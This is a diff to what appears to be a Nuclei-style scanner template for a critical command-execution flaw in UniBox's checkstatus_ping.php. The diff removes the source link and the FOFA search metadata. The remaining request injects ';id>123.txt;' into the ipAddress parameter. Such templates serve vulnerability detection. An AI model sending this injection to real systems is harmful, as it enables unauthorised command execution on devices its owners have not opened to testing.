@@ -3,12 +3,8 @@ info:
   name: unibox checkstatus_ping.php 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gf4mmscd4ugoo2g0'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gf4mmscd4ugoo2g0
-    fofa: body="UniBox"
 http:
 - raw:
   - 'GET /network/checkstatus_ping.php?ipAddress=;id>123.txt; HTTP/1.1
